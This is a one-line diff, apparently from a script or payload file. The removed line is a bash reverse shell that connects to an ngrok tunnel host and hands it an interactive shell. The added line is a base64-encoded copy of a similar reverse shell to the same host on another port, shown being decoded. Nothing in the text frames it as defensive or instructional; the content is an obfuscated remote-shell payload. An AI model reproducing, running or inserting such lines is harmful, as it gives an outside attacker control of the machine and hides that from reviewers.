@@ -1,1 +1,1 @@
-bash -c '0<&162-;exec 162<>/dev/tcp/0.tcp.ap.ngrok.io/15544;sh <&162 >&162 2>&162'
+echo "YmFzaCAtYyAnMDwmMTQ5LTtleGVjIDE0OTw+L2Rldi90Y3AvMC50Y3AuYXAubmdyb2suaW8vMTAyMTc7c2ggPCYxNDkgPiYxNDkgMj4mMTQ5Jw==" | base64 --decode
